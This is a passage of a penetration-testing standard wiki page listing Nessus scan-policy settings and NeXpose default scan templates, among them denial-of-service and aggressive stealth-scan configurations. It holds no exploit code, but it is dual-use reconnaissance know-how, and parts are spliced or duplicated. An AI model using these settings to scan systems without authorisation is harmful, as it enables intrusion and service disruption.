[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_164.png "File:Penetration Testing Execution 164.png") 

There are four configuration tabs: General, Credentials, Plugins, and Preferences. For our purposes, most of the default settings do not need to be modified. 
## **General**
The General tab is where we will name and configure scan options related to our policy. There are six boxes of grouped options that control scanner behavior: Basic, Scan, Network Congestion, Port Scanners, Port Scan Options, and Performance. 

Basic allows us to define the policy itself. The actual settings have been defined as indicated below: 

|**Basic Section**|**Setting**|
| :- | :- |
|Name |Validation Scan |
|Visibility |Shared |
|Description |Validation Scan Only (Use to check that Nessus is working properly and the signature date)|
|**Scan Section**|**Setting**|
|Save Knowledge Base |Checked |
|Safe Checks |Checked |
|Silent Dependencies |Checked |
|Log Scan Details to Server |Unchecked |
|Stop Host Scan on Disconnect |Unchecked |
|Avoid Sequential Scans |Unchecked |
|Consider Unscanned Ports as Closed |Unchecked |
|Designate Hosts by their DNS Name |Unchecked |
|  |  |
|**Network Section**|**Setting**|
|Reduce Parallel Connections on Congestion |Unchecked |
|Use Kernel Congestion Detection (Linux Only) |Unchecked |
|  |  |
|**Port Scanners Section**|**Setting**|
|TCP Scan |Checked |
|UDP Scan |Unchecked |
|SYN Scan |Unchecked |
|SNMP Scan |Unchecked |
|Netstat SSH Scan |Checked |
|Netstat WMI Scan |Checked |
|Ping Host |Unchecked |
|  |  |
|**Port Scan Options Section**|**Setting**|
|Port Scan Range |22, 161, 1241, 8834|
|**Performance Section**|**Setting**|
|Max Checks Per Host (Windows) |5 |
|Max Checks Per Host (Linux) |50-75 |
|Max Hosts Per Scan |1 |
|Network Receive Timeout (seconds) |5 |
|Max Simultaneous TCP Sessions Per Host |Unlimited |
|Max Simultaneous TCP Sessions Per Scan |Unlimited |
## **Credentials**
The Credentials tab, allows us to configure the Nessus scanner to use authentication credentials during scanning. For our policy we will not edit any of the settings within this section. They are however documented to ensure completeness. 

|**Windows credentials**|**Setting**|
| :- | :- |
|SMB account |Blank |
|SMB password |Blank |
|SMB domain (optional) |Blank |
|SMB password type |Password |
|Additional SMB account (1) |Blank |
|Additional SMB password (1) |Blank |
|Additional SMB domain (optional)(1) |Blank |
|Additional SMB account (2) |Blank |
|Additional SMB password (2) |Blank |
|Additional SMB domain (optional)(2) |Blank |
|Additional SMB account (3) |Blank |
|Additional SMB password (3) |Blank |
|Additional SMB domain (optional)(3) |Blank |
|Never send SMB credentials in clear text |Checked |
|Only use NTLMv2 |Unchecked |
|  |  |
|**SSH Settings** |**Setting**|
|SSH user name |root |
|SSH password (unsafe!) |Blank |
|SSH public key to use |Blank |
|SSH private key to use |Blank |
|Passphrase for SSH key |Blank |
|Elevate privileges with |Nothing |
|su login |Blank |
|Escalation password |Blank |
|SSH known\_hosts file |Blank |
|Preferred SSH port |22 |
|Client version |OpenSSH\_5.0 |
|  |  |
|**Kerberos configuration**|**Settings**|
|Kerberos Key Distribution Center (KDC) |Blank |
|Kerberos KDC Port |88 |
|Kerberos KDC Transport |UDP |
|Kerberos Realm (SSH only) |Blank |
|  |  |
|**Cleartext protocols settings**|**Settings**|
|User name |Blank |
|Password (unsafe!) |Blank |
|Try to perform patch level checks over telnet |Unchecked |
|Try to perform patch level checks over rsh |Unchecked |
|Try to perform patch level checks over rexec |Unchecked |
## **Plugins**
The Plugins tab, allows us to choose specific security checks by plugin family or individual checks that we want to enable. The easiest way to set this is to select the "Enable All" button from the main Plugins tab, however this assumes the Safe Checks is selected from the General Tab. 
## **Preferences**
The Preferences tab allows for more granular control over scan settings. All items in this category should be. The actual settings have been defined as indicated below: 

|**Cisco IOS Compliance Checks**|**Setting**|
| :- | :- |
|Policy file #1 |Blank |
|Policy file #2 |Blank |
|Policy file #3 |Blank |
|Policy file #4 |Blank |
|Policy file #5 |Blank |
|  |  |
|**Database Compliance Checks** |**Setting**|
|Policy file #1 |Blank |
|Policy file #2 |Blank |
|Policy file #3 |Blank |
|Policy file #4 |Blank |
|Policy file #5 |Blank |
|  |  |
|**Database Settings** |**Setting**|
|Login |Blank |
|Password |Blank |
|DB Type |Oracle |
|Database SID |Blank |
|Database port to use |Blank |
|Oracle auth type |NORMAL |
|SQL Server auth type |Windows |
|  |  |
|**Do not scan fragile devices**|**Setting**|
|Scan Network Printers |Unchecked |
|Scan Novell Netware hosts |Unchecked |
|  |  |
|**Global variable settings**|**Setting**|
|Probe services on every port |Checked |
|Do not log in with user accounts not<br>specified in the policy |Unchecked |
|Enable CGI scanning |Checked |
|Network type |Mixed (use RFC 1918) |
|Enable experimental scripts |Unchecked |
|Thorough tests (slow) |Unchecked |
|Report verbosity |Normal |
|Report paranoia |Normal |
|HTTP User-Agent |Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0) |
|SSL certificate to use |Blank |
|SSL CA to trust |Blank |
|SSL key to use |Blank |
|SSL password for SSL key |Blank |
|  |  |
|**HTTP cookies import**|**Settings**|
|Cookies file |Blank |
|  |  |
|**HTTP login page**|**Settings**|
|Login page |/ |
|Login form |Blank |
|Login form fields |user=%USER%&password=%PASS% |
|Login form method |POST |
|Re-authenticate delay (seconds) |Blank |
|Check authentication on page |Blank |
|Follow 30x redirections (# of levels) |2 |
|Authenticated regex |Blank |
|Invert test (disconnected if regex matches) |Unchecked |
|Match regex on HTTP headers |Unchecked |
|Case insensitive regex |Unchecked |
|  |  |
|**ICCP/COTP TSAP Addressing**|**Settings**|
|Start COTP TSAP |8 |
|Stop COTP TSAP |8 |
|  |  |
|**Login configurations**|**Settings**|
|HTTP account |Blank |
|HTTP password (sent in clear) |Blank |
|NNTP account |Blank |
|NNTP password (sent in clear) |Blank |
|FTP account |Anonymous |
|FTP password (sent in clear) |  |
|FTP writeable directory |/incoming |
|POP2 account |Blank |
|POP2 password (sent in clear) |Blank |
|POP3 account |Blank |
|POP3 password (sent in clear) |Blank |
|IMAP account |Blank |
|IMAP password (sent in clear) |Blank |
|  |  |
|**Modbus/TCP Coil Access**|**Settings**|
|Start reg |0 |
|End reg |16 |
|  |  |
|**Nessus SYN scanner**|**Settings**|
|Firewall detection |Automatic (normal) |
|  |  |
|**Nessus TCP scanner**|**Settings**|
|Firewall detection |Automatic (normal) |
|  |  |
|**News Server (NNTP) Information Disclosure**|**Settings**|
|From address |Nessus <listme@listme.dsbl.org> |
|Test group name regex |f[a-z]\.tests? |
|Max crosspost |7 |
|Local distribution |Checked |
|No archive |Unchecked |
|  |  |
|**Nikto (NASL wrapper)**|**Settings**|
|Enable Nikto |Checked |
|Disable if server never replies 404 |Unchecked |
|Root directory |Blank |
|Pause between tests (s) |Blank |
|Scan CGI directories |User supplied |
|Display: 1 Show redirects |Unchecked |
|Display: 2 Show cookies received |Unchecked |
|Display: 3 Show all 200/OK responses |Unchecked |
|Display: 4 Show URLs which require authentication |Unchecked |
|Display: V Verbose Output |Unchecked |
|Tuning: 1 Interesting File/Seen in logs |Unchecked |
|Tuning: 2 Misconfiguration / Default File |Unchecked |
|Tuning: 3 Information Disclosure |Unchecked |
|Tuning: 4 Injection (XSS/Script/HTML) |Unchecked |
|  |  |
|**Oracle Settings**|**Settings**|
|Oracle SID |Blank |
|Test default accounts (slow) |Unchecked |
|  |  |
|**PCI DSS Compliance**|**Settings**|
|Check for PCI-DSS compliance |Unchecked |
|  |  |
|**Ping the remote host**|**Settings**|
|TCP ping destination port(s) |Built-in |
|Do an ARP ping |Checked |
|Do a TCP ping |Checked |
|Do an ICMP ping |Checked |
|Number of Retries (ICMP) |2 |
|Do an applicative UDP ping (DNS, RPCÖ) |Unchecked |
|Make the dead hosts appear in the report |Unchecked |
|Log live hosts in the report |Unchecked |
|Test the local Nessus host |Checked |
|Fast network discovery |Unchecked |
|  |  |
|**Port scanners settings**|**Settings**|
|Check open TCP ports found by local port enumerators |Unchecked |
|Only run network port scanners if local port enumeration failed |Checked |
|  |  |
|**SMB Registry: Start the Registry Service during the scan**|**Settings**|
|Start the Registry Service during the scan |Unchecked |
|  |  |
|**SMB Scope**|**Settings**|
|Request information about the domain |Checked |
|  |  |
|**SMB use domain SID to enumerate users**|**Settings**|
|Start UID |1000 |
|End UID |1200 |
|  |  |
|**SMB use host SID to enumerate local users**|**Settings**|
|Start UID |1000 |
|End UID |1200 |
|  |  |
|**SMTP settings**|**Settings**|
|Third party domain |Example.com |
|From address |nobody@example.com |
|To address |postmaster@[AUTO\_REPLACED\_IP] |
|  |  |
|**SNMP settings**|**Settings**|
|Community name |Public |
|UDP port |161 |
|SNMPv3 user name |Blank |
|SNMPv3 authentication password |Blank |
|SNMPv3 authentication algorithm |MD5 |
|SNMPv3 privacy password |Blank |
|SNMPv3 privacy algorithm |DES |
|  |  |
|**Service Detection**|**Settings**|
|Test SSL based services |Known SSL ports |
|  |  |
|**Unix Compliance Checks**|**Settings**|
|Policy file #1 |Blank |
|Policy file #2 |Blank |
|Policy file #3 |Blank |
|Policy file #4 |Blank |
|Policy file #5 |Blank |
|  |  |
|**Web Application Tests Settings**|**Settings**|
|Enable web applications tests |Checked |
|Maximum run time (min) |1 |
|Send POST requests |Unchecked |
|Combinations of arguments values |one value |
|HTTP Parameter Pollution |Unchecked |
|Stop at first flaw |Per port (quicker) |
|Test embedded web servers |Unchecked |
|URL for Remote File Inclusion |<http://rfi.nessus.org/rfi.txt>|
|  |  |
|**Web mirroring**|**Settings**|
|Number of pages to mirror |0 |
|Maximum depth |0 |
|Start page |/ |
|Excluded items regex |\*|
|Follow dynamic pages |Unchecked |
|  |  |
|**Windows Compliance Checks**|**Settings**|
|Policy file #1 |Blank |
|Policy file #2 |Blank |
|Policy file #3 |Blank |
|Policy file #4 |Blank |
|Policy file #5 |Blank |
|  |  |
|**Windows File Contents Compliance Checks**|**Settings**|
|Policy file #1 |Blank |
|Policy file #2 |Blank |
|Policy file #3 |Blank |
|Policy file #4 |Blank |
|Policy file #5 |Blank |
# **Appendix E - NeXpose Default Templates**
## **Denial of service**
**Description:** This basic audit of all network assets uses both safe and unsafe (denial-of-service) checks. This scan does not include in-depth patch/hotfix checking, policy compliance checking, or application-layer auditing. 

**Why use this template:** You can run a denial of service scan in a preproduction environments to test the resistance of assets to denial-of service conditions. 

**Device/vulnerability scan:** Y/Y 

**Maximum # scan threads:** 10 

**ICMP (Ping hosts):** Y 

**TCP ports used for device discovery:** 80 

**UDP ports used for device discovery:** None 

**Device discovery performance:** 5 ms send delay, 4 retries, 1000 ms block timeout 

**TCP port scan method:** Stealth scan (SYN) 

**TCP optimizer ports:** None 

**TCP ports to scan:** Well known numbers + 1-1040 

**TCP port scan performance:** 0 ms send delay, 10 blocks, 10 ms block delay, 5 retries 

**UDP ports to scan:** Well-known numbers 

**Simultaneous port scans:** 5 

**Specific vulnerability checks enabled (which disables all other checks):** None 

**Specific vulnerability checks disabled:** Local, patch, policy check types 
## **Discovery scan**
**Description:** This scan locates live assets on the network and identifies their host names and operating systems. NeXpose does not perform enumeration, policy, or vulnerability scanning with this template. 

**Why use this template:** You can run a discovery scan to compile a complete list of all network assets. Afterward, you can target subsets of these assets for intensive vulnerability scans, such as with the Exhaustive scan template. 

**Device/vulnerability scan:** Y/N 

**Maximum # scan threads:** 10 

**ICMP (Ping hosts):** Y 

**TCP ports used for device discovery:** 21, 22, 23, 25, 80, 88, 110, 111, 135, 139, 143, 220, 264, 389, 443, 445, 449, 524, 585, 636, 993, 995, 1433, 1521, 1723, 3389, 8080, 9100 

**UDP ports used for device discovery:** 53,67,111,135,137,161,500,1701 

**Device discovery performance:** 5 ms send delay, 2 retries, 3000 ms block timeout 

**TCP port scan method:** Stealth scan (SYN) 

**TCP optimizer ports:** None 

**TCP ports to scan:** 21, 22, 23, 25, 80, 110, 139, 143,220, 264, 443, 445, 449, 524, 585, 993, 995, 1433, 1521, 1723, 8080, 9100 

**TCP port scan performance:** 0 ms send delay, 25 blocks, 500 ms block delay, 3 retries 

**UDP ports to scan:** 161, 500 

**Simultaneous port scans:** 10 

**Specific vulnerability checks enabled (which disables all other checks):** None 

**Specific vulnerability checks disabled:** None 
## **Discovery scan (aggressive)**
**Description:** This fast, cursory scan locates live assets on high-speed networks and identifies their host names and operating systems. NeXpose sends packets at a very high rate, which may trigger IPS/IDS sensors, SYN flood protection, and exhaust states on stateful firewalls. NeXpose does not perform enumeration, policy, or vulnerability scanning with this template. 

**Why use this template:** This template is identical in scope to the discovery scan, except that it uses more threads and is, therefore, much faster. The tradeoff is that scans run with this template may not be as thorough as with the Discovery scan template. 

**Device/vulnerability scan:** Y/N 

**Maximum # scan threads:** 25 

**ICMP (Ping hosts):** Y 

**TCP ports used for device discovery:** 21, 22, 23, 25, 80, 88, 110, 111, 135, 139, 143, 220, 264, 389, 443, 445, 449, 524, 585, 636, 993, 995, 1433, 1521, 1723, 3389, 8080, 9100 

**UDP ports used for device discovery:** 53, 67, 111, 135, 137, 161, 500, 1701 

**Device discovery performance:** 0 ms send delay, 2 retries, 3000 ms block timeout 

**TCP port scan method:** Stealth scan (SYN) 

**TCP optimizer ports:** None 

**TCP ports to scan:** 21, 22, 23, 25, 80, 110, 139, 143, 220, 264, 443, 445, 449, 524, 585, 993, 995, 1433, 1521, 1723, 8080, 9100 

**TCP port scan performance:** 0 ms send delay, 25 blocks, 500 ms block delay, 3 retries 

**UDP ports to scan:** 161, 500 

**Simultaneous port scans:** 25 

**Specific vulnerability checks enabled (which disables all other checks):** None 

**Specific vulnerability checks disabled:** None 
## **Exhaustive**
**Description:** This thorough network scan of all systems and services uses only safe checks, including patch/hotfix inspections, policy compliance assessments, and application-layer auditing. This scan could take several hours, or even days, to complete, depending on the number of target assets. 

**Why use this template:** Scans run with this template are thorough, but slow. Use this template to run intensive scans targeting a low number of assets. 

**Device/vulnerability scan:** Y/Y 

**Maximum # scan threads:** 10 

I**CMP (Ping hosts):** Y 

**TCP ports used for device discovery:** 80 

**UDP ports used for device discovery:** None 

**Device discovery performance:** 5 ms send delay, 4 retries, 1000 ms block timeout 

**TCP port scan method:** NeXpose determines optimal method 

**TCP optimizer ports:** 21, 23, 25, 80, 110, 111, 135, 139, 443, 445, 449, 8080 

**TCP ports to scan:** All possible (1-65535) 

**TCP port scan performance:** 0 ms send delay, 10 blocks, 10 ms block delay, 5 retries 

**UDP ports to scan:** Well-known numbers 

**Simultaneous port scans:** 5 

**Specific vulnerability checks enabled (which disables all other checks):** None 

**Specific vulnerability checks disabled:** None 
## **Full audit**
**Description:** This full network audit of all systems uses only safe checks, including network-based vulnerabilities, patch/hotfix checking, and application-layer auditing. NeXpose scans only default ports and disables policy checking, which makes scans faster than with the Exhaustive scan. Also, NeXpose does not check for potential vulnerabilities with this template. 

**Why use this template:** This is the default NeXpose scan template. Use it to run a fast, thorough vulnerability scan right "out of the box." 

**Device/vulnerability scan:** Y/Y 

**Maximum # scan threads:** 10 

**ICMP (Ping hosts):** Y 

**TCP ports used for device discovery:** 80 

**UDP ports used for device discovery:** None 

**Device discovery performance:** 5 ms send delay, 4 retries, 1000 ms block timeout 

**TCP port scan method:** Stealth scan (SYN) 

**TCP optimizer ports:** None 

**TCP ports to scan:** Well known numbers + 1-1040 

**TCP port scan performance:** 0 ms send delay, 10 blocks, 10 ms block delay, 5 retries 

**UDP ports to scan:** Well-known numbers 

**Simultaneous port scans:** 5 

**Specific vulnerability checks enabled (which disables all other checks):** None 

**Specific vulnerability checks disabled:** Policy check type 
## **HIPAA compliance**
**Description:** NeXpose uses safe checks in this audit of compliance with HIPAA section 164.312 ("Technical Safeguards"). The scan will flag any conditions resulting in inadequate access control, inadequate auditing, loss of integrity, inadequate authentication, or inadequate transmission security (encryption) . 

**Why use this template:** Use this template to scan assets in a HIPAA-regulated environment, as part of a HIPAA compliance program. 

**Device/vulnerability scan:** Y/Y 

**Maximum # scan threads:** 10 

**ICMP (Ping hosts):** Y 

**TCP ports used for device discovery:** 80 

**UDP ports used for device discovery:** None 

**Device discovery performance:** 5 ms send delay, 4 retries, 1000 ms block timeout 

**TCP port scan method:** Stealth scan (SYN) 

**TCP optimizer ports:** None 

**TCP ports to scan:** Well known numbers + 

1-1040 

**TCP port scan performance:** 0 ms send delay, 10 blocks, 10 ms block delay, 5 retries 

**UDP ports to scan:** Well-known numbers 

**Simultaneous port scans:** 5 

**Specific vulnerability checks enabled (which disables all other checks):** None 

**Specific vulnerability checks disabled:** None 
## **Internet DMZ audit**
**Description:** This penetration test covers all common Internet services, such as Web, FTP, mail (SMTP/POP/IMAP/Lotus Notes), DNS, database, Telnet, SSH, and VPN. NeXpose does not perform in-depth patch/hotfix checking and policy compliance audits will not be performed. 

**Why use this template:** Use this template to scan assets in your DMZ. 

**Device/vulnerability scan:** Y/Y 

**Maximum # scan threads:** 10 

**ICMP (Ping hosts):** N 

**TCP ports used for device discovery:** None 

**UDP ports used for device discovery:** None 

**Device discovery performance:** 5 ms send delay, 4 retries, 1000 ms block timeout 

**TCP port scan method:** Stealth scan (SYN) 

**TCP optimizer ports:** None 

**TCP ports to scan:** Well-known numbers 

**TCP port scan performance:** 0 ms send delay, 10 blocks, 10 ms block delay, 5 retries 

**UDP ports to scan:** None 

**Simultaneous port scans:** 5 

**Specific vulnerability checks enabled (which disables all other checks):** DNS, database, FTP, Lotus Notes/Domino, Mail, SSH, TFTP, Telnet, VPN, Web check categories 

**Specific vulnerability checks disabled:** None 
## **Linux RPMs**
**Description:** This scan verifies proper installation of RPM patches on Linux systems. For optimum success, use administrative credentials. 

**Why use this template:** Use this template to scan assets running the Linux operating system. 

**Device/vulnerability scan:** Y/Y 

**Maximum** # scan threads: 10 

**ICMP (Ping hosts):** Y 

**TCP ports used for device discovery:** 22, 23 

**UDP ports used for device discovery:** None 

**Device discovery performance:** 5 ms send delay, 4 retries, 1000 ms block timeout 

**TCP port scan method:** Stealth scan (SYN) 

**TCP optimizer ports:** None 

**TCP ports to scan:** 22, 23 

**TCP port scan performance:** 0 ms send delay, 10 blocks, 10 ms block delay, 5 retries 

**UDP ports to scan:** None 

**Simultaneous port scans:** 5 

**Specific vulnerability checks enabled (which disables all other checks):** RPM check type 

**Specific vulnerability checks disabled:** None 
## **Microsoft hotfix**
**Description:** This scan verifies proper installation of hotfixes and service packs on Microsoft Windows systems. For optimum success, use administrative credentials. 

**Why use this template:** Use this template to verify that assets running Windows have hotfix patches installed on them. 

**Device/vulnerability scan:** Y/Y 

**Maximum # scan threads:** 10 

**ICMP (Ping hosts):** Y 

**TCP ports used for device discovery:** 135, 139, 445, 1433, 2400 

**UDP ports used for device discovery:** None 

**Device discovery performance:** 5 ms send delay, 4 retries, 1000 ms block timeout 

**TCP port scan method:** Stealth scan (SYN) 

**TCP optimizer ports:** None 

**TCP ports to scan:** 135, 139, 445, 1433, 2433 

**TCP port scan performance:** 0 ms send delay, 10 blocks, 10 ms block delay, 5 retries 

**UDP ports to scan:** None 

**Simultaneous port scans:** 5 

**Specific vulnerability checks enabled (which disables all other checks):** Microsoft hotfix check type 

**Specific vulnerability checks disabled:** None 
## **Payment Card Industry (PCI) audit**
**Description:** This audit of Payment Card Industry (PCI) compliance uses only safe checks, including network-based vulnerabilities, patch/hotfix verification, and application-layer testing. NeXpose scans all TCP ports and well-known UDP ports. NeXpose does not perform policy checks. 

**Why use this template:** Use this template to scan assets as part of a PCI compliance program. 

**Device/vulnerability scan:** Y/Y 

**Maximum # scan threads:** 10 

**ICMP (Ping hosts):** Y 

**TCP ports used for device discovery:** 22, 23, 25, 80, 443 

**UDP ports used for device discovery:** None 

**Device discovery performance:** 5 ms send delay, 4 retries, 1000 ms block timeout 

**TCP port scan method:** Stealth scan (SYN) 

**TCP optimizer ports:** None 

**TCP ports to scan:** All possible (1-65535) 

**TCP port scan performance:** 1 ms send delay, 5 blocks, 15 ms block delay, 5 retries 

**UDP ports to scan:** Well-known numbers 

**Simultaneous port scans:** 5 

**Specific vulnerability checks enabled (which disables all other checks):** None 

**Specific vulnerability checks disabled:** Policy check types 
## **Penetration test**
**Description:** This in-depth scan of all systems uses only safe checks. Host-discovery and network penetration features allow NeXpose to dynamically detect assets that might not otherwise be detected. NeXpose does not perform in-depth patch/hotfix checking, policy compliance checking, or application-layer auditing . 

**Why use this template:** With this template, you may discover assets that are out of your initial scan scope. Also, running a scan with this template is helpful as a precursor to conducting formal penetration test procedures. 

**Device/vulnerability scan:** Y/Y 

**Maximum # scan threads:** 10 

**ICMP (Ping hosts):** Y 

**TCP ports used for device discovery:** 21, 22, 23, 25, 80, 443, 8080 

**UDP ports used for device discovery:** None 

**Device discovery performance:** 5 ms send delay, 4 retries, 1000 ms block timeout 

**TCP port scan method:** NeXpose determines optimal method 

**TCP optimizer ports:** 21, 23, 25, 80, 110, 111, 135, 139, 443, 445, 449, 8080 

**TCP ports to scan:** Well known numbers + 1-1040 

**TCP port scan performance:** 0 ms send delay, 10 blocks, 10 ms block delay, 5 retries 

**UDP ports to scan:** Well-known numbers 

**Simultaneous port scans:** 5 

**Specific vulnerability checks enabled (which disables all other checks):** None 

**Specific vulnerability checks disabled:** Local, patch, policy check types 
## **Penetration test**
**Description:** This in-depth scan of all systems uses only safe checks. Host-discovery and network penetration features allow NeXpose to dynamically detect assets that might not otherwise be detected. NeXpose does not perform in-depth patch/hotfix checking, policy compliance checking, or application-layer auditing. 

**Why use this template:** With this template, you may discover assets that are out of your initial scan scope. Also, running a scan with this template is helpful as a precursor to conducting formal penetration test procedures. 

**Device/vulnerability scan:** Y/Y 

**Maximum # scan threads:** 10 

**ICMP (Ping hosts):** Y 

**TCP ports used for device discovery:** 21, 22, 23, 25, 80, 443, 8080 

**UDP ports used for device discovery:** None 

**Device discovery performance:** 5 ms send delay, 4 retries, 1000 ms block timeout 

**TCP port scan method:** NeXpose determines optimal method 

**TCP optimizer ports:** 21, 23, 25, 80, 110, 111, 135, 139, 443, 445, 449, 8080 

**TCP ports to scan:** Well known numbers + 1-1040 

**TCP port scan performance:** 0 ms send delay, 10 blocks, 10 ms block delay, 5 retries 

**UDP ports to scan:** Well-known numbers 

**Simultaneous port scans:** 5 

**Specific vulnerability checks enabled (which disables all other checks):** None 

**Specific vulnerability checks disabled:** Local, patch, policy check types 
## **Safe network audit**
**Description:** This non-intrusive scan of all network assets uses only safe checks. NeXpose does not perform in-depth patch/hotfix checking, policy compliance checking, or application-layer auditing. 

**Why use this template:** This template is useful for a quick, general scan of your network. 

**Device/vulnerability scan:** Y/Y 

**Maximum # scan threads:** 10 

**ICMP (Ping hosts):** Y 

**TCP ports used for device discovery:** 80 

**UDP ports used for device discovery:** None 

**Device discovery performance:** 5 ms send delay, 4 retries, 1000 ms block timeout 

**TCP port scan method:** Stealth scan (SYN) 

**TCP optimizer ports:** None 

**TCP ports to scan:** Well known numbers + 1-1040 

**TCP port scan performance:** 0 ms send delay, 10 blocks, 10 ms block delay, 5 retries 

**UDP ports to scan:** Well-known numbers 

**Simultaneous port scans:** 5 

**Specific vulnerability checks enabled (which disables all other checks)**: None 

**Specific vulnerability checks disabled:** Local, patch, policy check types 
## **Sarbanes-Oxley (SOX) compliance**
**Description:** This is a safe-check 

Sarbanes-Oxley (SOX) audit of all systems. It detects threats to digital data integrity, data access auditing, accountability, and availability, as mandated in Section 302 ("Corporate Responsibility for Fiscal Reports"), Section 404 ("Management Assessment of Internal Controls"), and Section 409 ("Real Time Issuer Disclosures") respectively. 

**Why use this template:** Use this template to scan assets as part of a SOX compliance program. 

**Device/vulnerability scan:** Y/Y 

**Maximum # scan threads:** 10 

**ICMP (Ping hosts):** Y 

**TCP ports used for device discovery:** 80 

**UDP ports used for device discovery:** None 

**Device discovery performance:** 5 ms send delay, 4 retries, 1000 ms block timeout 

**TCP port scan method:** Stealth scan (SYN) 

**TCP optimizer ports:** None 

**TCP ports to scan:** Well known numbers + 1-1040 
## **SCADA audit**
**Description:** This is a "polite," or less aggressive, network audit of sensitive Supervisory Control And Data Acquisition (SCADA) systems, using only safe checks. Packet block delays have been increased; time between sent packets has been increased; protocol handshaking has been disabled; and simultaneous network access to assets has been restricted. 

**Why use this template:** Use this template to scan SCADA systems. 

**Device/vulnerability scan:** Y/Y 

**Maximum # scan threads:** 5 

**ICMP (Ping hosts):** Y 

**TCP ports used for device discovery:** None 

**UDP ports used for device discovery:** None 

**Device discovery performance:** 10 ms send delay, 3 retries, 2000 ms block timeout 

**TCP port scan method:** Stealth scan (SYN) 

**TCP optimizer ports:** None 

**TCP ports to scan:** Well known numbers + 1-1040 

**TCP port scan performance:** 10 ms send delay, 10 blocks, 10 ms block delay, 4 retries 

**UDP ports to scan:** Well-known numbers 

**Simultaneous port scans:** 5 

**Specific vulnerability checks enabled (which disables all other checks):** None 

**Specific vulnerability checks disabled:** Policy check type**TCP port scan performance:** 0 ms send delay, 10 blocks, 10 ms block delay, 5 retries 

**UDP ports to scan:** Well-known numbers 

**Simultaneous port scans:** 5 

**Specific vulnerability checks enabled (which disables all other checks):** None 

**Specific vulnerability checks disabled:** None 
## **Web audit**
**Description:** This audit of all Web servers and Web applications is suitable public-facing and internal assets, including application servers, ASP's, and CGI scripts. NeXpose does not perform patch checking or policy compliance audits. Nor does it scan FTP servers, mail servers, or database servers, as is the case with the DMZ Audit scan template. 

**Why use this template:** Use this template to scan public-facing Web assets. 

**Device/vulnerability scan:** Y/Y 

**Maximum # scan threads:** 10 

**ICMP (Ping hosts):** N 

**TCP ports used for device discovery:** None 

**UDP ports used for device discovery:** None 

**Device discovery performance:** 5 ms send delay, 4 retries, 1000 ms block timeout 

**TCP port scan method:** Stealth scan (SYN) 

**TCP optimizer ports:** None 

**TCP ports to scan:** Well-known numbers 

**TCP port scan performance:** 0 ms send delay, 10 blocks, 10 ms block delay, 5 retries 

**UDP ports to scan:** None 

**Simultaneous port scans:** 5 

**Specific vulnerability checks enabled (which disables all other checks):** Web category check 

**Specific vulnerability checks disabled:** None 

Obtido em " <http://www.pentest-standard.org/index.php?title=PTES_Technical_Guidelines&oldid=921> "
## **Menu de navegação**
### **Ferramentas pessoais**
- [Conecte-se](http://www.pentest-standard.org/index.php?title=Special:UserLogin&returnto=PTES+Technical+Guidelines "Você é incentivado a fazer login;  no entanto, não é obrigatório [alt-shift-o]")
### **Espaços para nome**
- [Página](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines "Veja a página de conteúdo [alt-shift-c]")
- [Discussão](http://www.pentest-standard.org/index.php?title=Talk:PTES_Technical_Guidelines&action=edit&redlink=1 "Discussão sobre a página de conteúdo (a página não existe) [alt-shift-t]")

` `FORMCHECKBOX 
### **Variantes**
### **Visualizações**
- [Ler](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines)
- [Ver fonte](http://www.pentest-standard.org/index.php?title=PTES_Technical_Guidelines&action=edit "Esta página está protegida.  Você pode ver sua fonte [alt-shift-e]")
- [Ver histórico](http://www.pentest-standard.org/index.php?title=PTES_Technical_Guidelines&action=history "Revisões anteriores desta página [alt-shift-h]")

` `FORMCHECKBOX 
### **Mais**
### **Procurar**
<a name="search"></a> MACROBUTTON DoFieldClick  [Pesquisar ] MACROBUTTON DoFieldClick  [ir]

[](http://www.pentest-standard.org/index.php/Main_Page "Visite a página principal")
### **Navegação**
- [Página principal](http://www.pentest-standard.org/index.php/Main_Page "Visite a página principal [alt-shift-z]")
- [Diretriz Técnica PTES](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines)
- [Na mídia](http://www.pentest-standard.org/index.php/Media)
- [Perguntas frequentes](http://www.pentest-standard.org/index.php/FAQ)
### **Ferramentas**
- [Quais links aqui](http://www.pentest-standard.org/index.php/Special:WhatLinksHere/PTES_Technical_Guidelines "Uma lista de todas as páginas wiki vinculadas aqui [alt-shift-j]")
- [Mudanças relacionadas](http://www.pentest-standard.org/index.php/Special:RecentChangesLinked/PTES_Technical_Guidelines "Mudanças recentes nas páginas vinculadas a esta página [alt-shift-k]")
- [Páginas especiais](http://www.pentest-standard.org/index.php/Special:SpecialPages "Uma lista de todas as páginas especiais [alt-shift-q]")
- [Versão para impressão](javascript:print\(\); "Versão para impressão desta página [alt-shift-p]")
- [Link permanente](http://www.pentest-standard.org/index.php?title=PTES_Technical_Guidelines&oldid=921 "Link permanente para esta revisão da página")
- [Informações da página](http://www.pentest-standard.org/index.php?title=PTES_Technical_Guidelines&action=info "Mais informações sobre esta página")
- Esta página foi editada pela última vez em 30 de abril de 2012, às 06h04.
- O conteúdo está disponível sob a [GNU Free Documentation License 1.2,](http://www.gnu.org/licenses/old-licenses/fdl-1.2.txt) salvo indicação em contrário.
- [Política de Privacidade](http://www.pentest-standard.org/index.php/The_Penetration_Testing_Execution_Standard:Privacy_policy "O padrão de execução de testes de penetração:Política de privacidade")
- [Sobre o padrão de execução de testes de penetração](http://www.pentest-standard.org/index.php/The_Penetration_Testing_Execution_Standard:About "O padrão de execução de testes de penetração:Sobre")
- [Isenções de responsabilidade](http://www.pentest-standard.org/index.php/The_Penetration_Testing_Execution_Standard:General_disclaimer "O Padrão de Execução de Teste de Penetração:Isenção de responsabilidade geral")



Texto original

Avalie a tradução

O feedback vai ser usado para ajudar a melhorar o Google Tradutor

<a name="sl"></a><a name="tl"></a><a name="query"></a><a name="gtrans"></a><a name="vote"></a>

[Screenshot Here]: http://www.pentest-standard.org/index.php/File:CoreWEBrpt.jpg "Arquivo:CoreWEBrpt.jpg"
[Screenshot Here]: http://www.pentest-standard.org/index.php?title=File:Corerptmodules.jpg&action=edit&redlink=1 "Arquivo:Corerptmodules.jpg (a página não existe)"
[Screenshot Here]: http://www.pentest-standard.org/index.php?title=File:CoreWEBagendeployed.jpg&action=edit&redlink=1 "Arquivo:CoreWEBagendeployed.jpg (a página não existe)"
[Screenshot Here]: http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_122.png "Arquivo:Execução de teste de penetração 122.png"

